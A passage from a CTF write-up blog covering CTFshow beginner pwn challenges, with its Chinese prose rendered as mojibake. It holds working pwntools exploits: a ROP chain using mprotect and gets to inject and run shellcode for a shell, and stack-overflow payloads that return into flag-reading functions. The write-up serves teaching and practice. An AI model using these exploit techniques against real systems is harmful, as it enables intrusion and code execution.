</span></span><span class="line"><span class="cl"><span class="n">gets</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;gets&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é˜¶æ®µ2ï¼šè°ƒç”¨mprotectä¿®æ”¹å†…å­˜æƒé™</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss_start_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mprotect</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Hello CTFshow&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é˜¶æ®µ3ï¼šåˆ©ç”¨getså†™å…¥shellcode</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">gets</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Hello CTFshow&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># é˜¶æ®µ4ï¼šè·³è½¬åˆ°shellcodeæ‰§è¡Œ</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x20</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">shellcode_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Hello CTFshow&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®©æˆ‘ç»™ä½ é€æ­¥è§£é‡Šï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_rdx_ret1</span> <span class="o">=</span> <span class="mh">0x0000000000001b96</span>  
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_ret1</span> <span class="o">=</span> <span class="mh">0x0000000000023a6a</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œå‰é¢æœ‰ä¸ª1æ˜¯æ–¹ä¾¿åŒºåˆ†ï¼Œè¿™ä¸¤ä¸ªgadgetæ˜¯åœ¨libcåº“ä¸Šçš„é€šç”¨gadgetï¼Œå—ASLRä¿æŠ¤ï¼Œåœ°å€æ˜¯åŠ¨æ€å˜åŒ–çš„ï¼Œéœ€è¦ç”¨<code>æ‰€æœ‰å‡½æ•°çš„çœŸå®åœ°å€ = libc åŸºåœ°å€ + å‡½æ•°çš„æœ¬åœ°åç§»</code>å¾—å‡ºåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">leak_address</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³„éœ²putsåœ¨æœ¬åœ°ç¨‹åºçš„åœ°å€ï¼Œå†æ³„éœ²putså†libcåº“çš„åœ°å€æ¨å‡ºåç§»é‡ï¼Œå·²çŸ¥æœ¬åœ°ç¨‹åºçš„æ¯ä¸ªå‡½æ•°åœ°å€åç§»é‡ç›¸åŒï¼ŒçŸ¥é“åç§»é‡åï¼Œæ³„éœ²libcæ ‡å‡†åº“çš„gadgetï¼ˆ<code>/lib/x86_64-linux-gnu/libc.so.6</code>ï¼‰å°±èƒ½åæ¨å‡ºæœ¬åœ°ç¨‹åºgadgetçš„çœŸå®åœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rsi_ret1</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">pop_rdx_ret1</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ‰ä¸ªé—®é¢˜ï¼šä¸ºä»€ä¹ˆgets = libc.sym[&lsquo;gets&rsquo;]å°±æ˜¯çœŸå®åœ°å€å‘¢ï¼Œä½ ä¼šè®¤ä¸ºå®ƒå°±æ˜¯libcåº“çš„é€šç”¨åœ°å€ï¼Œæ˜¯ä¸æ˜¯åº”è¯¥åŠ ä¸Šæœ¬åœ°åç§»é‡å‘¢ï¼Ÿ</p>
<blockquote>
<p><code>libc.sym['gets']</code> æœ€ç»ˆæ˜¯çœŸå®åœ°å€çš„åŸå› æ˜¯ï¼š</p>
<ol>
<li>å®ƒåŸæœ¬æ˜¯ â€œåç§»é‡â€ï¼ˆç›¸å¯¹äº libc åŸºåœ°å€ï¼‰ï¼›</li>
<li>å½“ä½ è®¾ç½® <code>libc.address = libc_base</code> åï¼Œ<code>pwntools</code> è‡ªåŠ¨å°† â€œåŸºåœ°å€ + åç§»é‡â€ åˆå¹¶ï¼Œå¾—åˆ°çœŸå®åœ°å€ã€‚</li>
</ol>
</blockquote>
<blockquote class="alert alert-note">
    <blockquote>
<p><code>libc.address</code> ä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè€Œæ˜¯ <code>pwntools</code> ä¸­ <code>ELF</code> ç±»çš„ä¸€ä¸ª<strong>å±æ€§ï¼ˆattributeï¼‰</strong>ï¼Œç”¨äºå­˜å‚¨å’Œè®¾ç½® ELF æ–‡ä»¶ï¼ˆè¿™é‡Œç‰¹æŒ‡ libc åº“ï¼‰åœ¨å†…å­˜ä¸­çš„åŸºåœ°å€ã€‚</p>
<p>å½“ä½ é€šè¿‡ <code>libc = ELF('libc.so.6')</code> åŠ è½½ libc åº“åï¼Œ<code>libc.address</code> é»˜è®¤å€¼ä¸º <code>0</code>ï¼ˆè¡¨ç¤ºå°šæœªè®¾ç½®åŸºåœ°å€ï¼‰ã€‚</p>
</blockquote></blockquote>
<p>æ€»çš„æ¥è¯´è¿™é¢˜è´¨é‡ä¸é”™ï¼Œè€—äº†æˆ‘ä¸¤å¤©ç©ºé—²æ—¶é—´å»æ”»å…‹ã€‚</p>
<h3 id="pwn_051">PWN_051
</h3><p>é¢˜ç›®ï¼šIâ€˜m IronManï¼›</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167.png"
	width="825"
	height="214"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167_hu_87fa00768af6d9eb.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/167_hu_5d4af73eb38f32b1.png 1024w"
	loading="lazy"
	
		alt="32ä½å…³é—­æ ˆä¿æŠ¤ä»¥åŠPIE"
	
	
		class="gallery-image" 
		data-flex-grow="385"
		data-flex-basis="925px"
	
></p>
<p>IDAæŠ½è±¡ğŸ¤¦â€ğŸ˜„&hellip;</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168.png"
	width="1545"
	height="583"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168_hu_85b4abbb3660f982.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/168_hu_f5473e747256948b.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="265"
		data-flex-basis="636px"
	
></p>
<p>è·Ÿè¿›mainå‡½æ•°ï¼Œè¿™æ¬¡å‡½æ•°åå­—æ¯”è¾ƒéš¾è®°ï¼Œå¯ä»¥æ”¹ä¸ªåå­—ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169.png"
	width="1035"
	height="455"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169_hu_9a03f1dbf9af4215.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/169_hu_1e041167a5b894e3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="227"
		data-flex-basis="545px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170.png"
	width="620"
	height="180"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170_hu_79a8cee284c0d251.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/170_hu_7c31f7e1b55ae952.png 1024w"
	loading="lazy"
	
		alt="æ›´æ”¹åå­—å"
	
	
		class="gallery-image" 
		data-flex-grow="344"
		data-flex-basis="826px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171.png"
	width="660"
	height="1080"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171_hu_c36869fb038422ed.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/171_hu_cd0446a43f1edacb.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="61"
		data-flex-basis="146px"
	
></p>
<p>å¾ˆæ˜æ˜¾è¿™æ˜¯ç”¨C++å†™çš„ï¼Œè¿™é‡Œæˆ‘çœ‹çš„ä¸å¤ªæ‡‚ï¼Œå€Ÿç”¨AIè§£è¯»&hellip;</p>
<p>åœ¨å¾€sä¸­readçš„æ—¶å€™å¤§å°æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯ç¨‹åºåœ¨ä¸‹é¢å°†å­—ç¬¦&quot;I&quot;æ›¿æ¢æˆ äº†&quot;IronMan&quot;ï¼Œæœ€ååœ¨strcpyçš„æ—¶å€™å‘ç”Ÿäº†æº¢å‡ºã€‚åªéœ€è¦ç®€å•è®¡ç®—ä¸€ä¸‹ï¼Œé‚£ä¹ˆåœ¨è¾“å…¥16ä¸ªâ€œIâ€ å°±ä¼šè¢«æ›¿æ¢ä¸º 16 * 7 = 112ä¸ªå­—ç¬¦ï¼Œè€Œsè·ebpçš„è·ç¦»ä¸º 0x6c = 108ã€‚</p>
<p>æ­£å¸¸æº¢å‡ºè¦†ç›–åˆ°è¿”å›åœ°å€å°±æ˜¯ cyclic(0x6c+4) = cyclic(112) ,è¾“å…¥16ä¸ªIåˆšå¥½æ›¿æ¢æˆ 16ä¸ª&quot;IronMan&quot;ï¼Œåˆšå¥½æ˜¯112ä¸ªï¼Œä¹Ÿå°±åˆšå¥½è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œä½†ç”¨å…¶å®ƒå­—ç¬¦æ¯”å¦‚aä¸å¯ä»¥ï¼Œå› ä¸ºä¼šå†è°ƒç”¨ <code>std::string::operator+=</code> å°†è¾“å…¥çš„ <code>&quot;a&quot;*112</code> æ‹¼æ¥åˆ°è¿™ä¸ªå›ºå®šå‰ç¼€ä¹‹åã€‚æ­¤æ—¶ï¼Œå­—ç¬¦ä¸²æ€»é•¿åº¦å·²å˜ä¸º <strong>â€œå›ºå®šå‰ç¼€é•¿åº¦ + 112 å­—èŠ‚â€</strong>ï¼Œå¿…ç„¶è¶…è¿‡ 112 å­—èŠ‚ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172.png"
	width="1255"
	height="445"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172_hu_27afd99bc34b6d8a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/172_hu_b9863ff8944de29a.png 1024w"
	loading="lazy"
	
		alt="shift &#43; F12æŸ¥çœ‹å­—ç¬¦ä¸²"
	
	
		class="gallery-image" 
		data-flex-grow="282"
		data-flex-basis="676px"
	
></p>
<p>è®©æˆ‘å‘ç°äº†<strong>cat /ctfshow_flag</strong>ï¼Œå¯ä»¥åˆ©ç”¨æ ˆæº¢å‡ºæ¥æ‰§è¡Œè¿™ä¸ªcatflagçš„å‘½ä»¤ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173.png"
	width="925"
	height="270"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173_hu_1ac11bfcef4c507f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/173_hu_312bc12e61d10954.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="822px"
	
></p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174.png"
	width="1085"
	height="356"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174_hu_cde4da8a3d61171.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/174_hu_1cda939199b13027.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="304"
		data-flex-basis="731px"
	
></p>
<p>æ‰¾å®ƒåœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175.png"
	width="646"
	height="61"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175_hu_2bf71b1fe453b1b0.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/175_hu_8c599f0fad61de00.png 1024w"
	loading="lazy"
	
		alt="Alt &#43; TæŸ¥è¯¢"
	
	
		class="gallery-image" 
		data-flex-grow="1059"
		data-flex-basis="2541px"
	
></p>
<p>åœ°å€ï¼š804902E</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28216</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">get_flag</span> <span class="o">=</span> <span class="mh">0x804902E</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;I&#34;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">get_flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_052">PWN_052
</h3><p>é¢˜ç›®ï¼šè¿é¢èµ°æ¥çš„flagè®©æˆ‘å¦‚æ­¤è ¢è ¢æ¬²åŠ¨ï¼›</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176.png"
	width="739"
	height="204"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176_hu_7ed53533366a2e52.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/176_hu_76a91fbb4acab851.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="362"
		data-flex-basis="869px"
	
></p>
<p>IDA32ä½åˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177.png"
	width="686"
	height="184"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177_hu_afb68bf3489fef2a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/177_hu_4446c7a38ba878d5.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="372"
		data-flex-basis="894px"
	
></p>
<p>è®©æˆ‘çœ‹åˆ°äº†getså‡½æ•°ã€‚</p>
<p>è·Ÿè¿›flagå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178.png"
	width="944"
	height="345"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178_hu_c542e5fc3e82054f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/178_hu_8c4a240f10e94703.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="273"
		data-flex-basis="656px"
	
></p>
<p>è¿™æ®µ C è¯­è¨€ä»£ç å®šä¹‰äº†ä¸€ä¸ªåä¸ºflagçš„å‡½æ•°ï¼Œä¸»è¦åŠŸèƒ½æ˜¯è¯»å–å¹¶è¾“å‡ºç‰¹å®šæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œä½†æœ‰æ¡ä»¶é™åˆ¶ã€‚æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ï¼š
å‡½æ•°é¦–å…ˆå°è¯•æ‰“å¼€/ctfshow_flagæ–‡ä»¶ç”¨äºè¯»å–ï¼Œ
å¦‚æœæ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼Œä¼šè¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºï¼›
å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œä¼šè¯»å–æ–‡ä»¶ä¸­çš„å†…å®¹åˆ°sæ•°ç»„ã€‚ï¼ˆæœ€å¤š 64 ä¸ªå­—ç¬¦ï¼‰</p>
<p>å‡½æ•°çš„è¿”å›é€»è¾‘ï¼š
å½“å‚æ•°a1ç­‰äº 0x36C ä¸”a2ç­‰äº 0x36D æ—¶ï¼Œä½¿ç”¨printf(s)è¾“å‡ºæ–‡ä»¶å†…å®¹å¹¶è¿”å›ï¼›å¦åˆ™ï¼Œç›´æ¥è¿”å›fgetsçš„ç»“æœã€‚ï¼ˆå³è¯»å–åˆ°çš„å­—ç¬¦ä¸²ï¼‰</p>
<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´è¦†ç›–è¿”å›åœ°å€ï¼Œè¿”å›åˆ°è¿™ä¸ªflagå‡½æ•°å¹¶æ‰§è¡Œå°±èƒ½è·å¾—flagã€‚</p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28261</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0x6c</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x36C</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x36D</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ç±»canaryçˆ†ç ´"><strong>ç±»canaryçˆ†ç ´</strong>
</h3><h3 id="pwn_053">PWN_053
</h3><p>é¢˜ç›®ï¼šå†å¤šä¸€çœ¼çœ‹ä¸€çœ¼å°±ä¼šçˆ†ç‚¸ï¼›</p>
<p>checksecçœ‹ä¿¡æ¯&hellip;.æ²¡å¼€canaryã€PIEï¼Œæœ‰NX</p>
<p>è·Ÿè¿›flagå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179.png"
	width="785"
	height="309"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179_hu_609a70c9b8d82948.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/179_hu_76ce6657743640.png 1024w"
	loading="lazy"
	
		alt="flagå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="254"
		data-flex-basis="609px"
	
></p>
<p>å‡½æ•°çš„æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
å®šä¹‰ä¸€ä¸ª 64 å­—èŠ‚çš„å­—ç¬¦æ•°ç»„så’Œä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆstreamã€‚å°è¯•æ‰“å¼€è·¯å¾„ä¸º/ctfshow_flagçš„æ–‡ä»¶ç”¨äºè¯»å–ã€‚</p>
<p>å¦‚æœæ–‡ä»¶æ‰“å¼€å¤±è´¥ï¼ˆstreamä¸º NULLï¼‰ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶é€€å‡ºç¨‹åºï¼›å¦‚æœæ–‡ä»¶æ‰“å¼€æˆåŠŸï¼Œä½¿ç”¨fgetsä»æ–‡ä»¶ä¸­è¯»å–æœ€å¤š 64 ä¸ªå­—ç¬¦åˆ°æ•°ç»„sä¸­ï¼Œé€šè¿‡puts(s)è¾“å‡ºè¯»å–åˆ°çš„å†…å®¹ï¼ˆä¼šè‡ªåŠ¨åœ¨æœ«å°¾æ·»åŠ æ¢è¡Œç¬¦ï¼‰ï¼Œè°ƒç”¨fflush(stdout)åˆ·æ–°æ ‡å‡†è¾“å‡ºç¼“å†²åŒºï¼Œå¹¶å°†å…¶è¿”å›å€¼ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚</p>
<p>è¿™æ®µä»£ç çš„é€»è¾‘æ¯”ä¸Šä¸€ä¸ªç‰ˆæœ¬æ›´ç›´æ¥ï¼Œä¸éœ€è¦ç‰¹å®šå‚æ•°å³å¯è¾“å‡º flag å†…å®¹ï¼Œåªè¦æˆåŠŸæ‰“å¼€æ–‡ä»¶å°±ä¼šç›´æ¥æ‰“å°æ–‡ä»¶ä¸­çš„å†…å®¹ã€‚fflush(stdout)çš„ä½œç”¨æ˜¯ç¡®ä¿å†…å®¹ç«‹å³è¾“å‡ºåˆ°ç»ˆç«¯ï¼Œè€Œä¸ä¼šåœç•™åœ¨ç¼“å†²åŒºä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´åªè¦æ‰§è¡Œåˆ°flagå‡½æ•°å°±ç›´æ¥ç»™flagå­—ç¬¦ä¸²ã€‚</p>
<p>åœ¨å‡½æ•°ç›®å½•ä¸Šçœ‹åˆ°äº†canaryå‡½æ•°ï¼Œè¿™è¿˜æ˜¯ç¬¬ä¸€æ¬¡è§åˆ°æ‰‹åŠ¨æ”¾ç½®çš„canaryï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181.png"
	width="844"
	height="288"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181_hu_c5e21505468ae92f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/181_hu_de81624b0c62b6b1.png 1024w"
	loading="lazy"
	
		alt="canaryå‡½æ•°"
	
	
		class="gallery-image" 
		data-flex-grow="293"
		data-flex-basis="703px"
	
></p>
<p>è¿™æ®µä»£ç çš„åŠŸèƒ½æ˜¯ä»æ ‡å‡†è¾“å…¥è¯»å–ç”¨æˆ·è¾“å…¥çš„å­—èŠ‚æ•°ï¼Œå¹¶å°†ç›¸åº”å­—èŠ‚æ•°çš„æ•°æ®è¯»å–åˆ°ç¼“å†²åŒº buf ä¸­ã€‚ç„¶åï¼Œå®ƒä¼šæ£€æŸ¥å †æ ˆçš„å®Œæ•´æ€§ï¼Œå¦‚æœå †æ ˆè¢«ç ´åï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯å¹¶ç»ˆæ­¢ç¨‹åºã€‚</p>
